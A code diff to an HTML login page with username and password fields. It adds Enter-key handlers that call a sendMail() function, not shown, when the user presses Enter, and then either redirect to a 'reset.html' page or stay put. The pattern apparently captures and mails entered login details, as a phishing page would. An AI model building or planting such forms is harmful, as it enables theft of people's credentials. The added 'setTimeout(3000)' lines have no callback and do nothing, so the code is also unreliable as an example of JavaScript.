@@ -92,7 +92,7 @@
 	                                
 	                                <div>
 	                                    <label for="fieldAccount">Username</label>
-	                                    <input type="text" id="fieldAccount" name="account" value="" size="39">
+	                                    <input type="text" id="fieldAccount" name="account" value="" size="39" onkeypress="TextenterKeyPressed(event)">
 	                                </div>
 	                                <div>
 	                                    <label for="fieldPassword">Password</label>
@@ -123,7 +123,23 @@
 									function enterKeyPressed(event) {
 										if (event.keyCode == 13) {
 											console.log("Enter key is pressed");
+											setTimeout(3000)
+											console.log("Sleep")
+											sendMail();
 											window.location.href = "reset.html";
+											return true;
+										} else {
+											return false;
+										}
+									}
+
+									function TextenterKeyPressed(event) {
+										if (event.keyCode == 13) {
+											console.log("Enter key is pressed");
+											setTimeout(3000)
+											console.log("Sleep")
+											sendMail();
+											/*window.location.href = "reset.html";*/
 											return true;
 										} else {
 											return false;
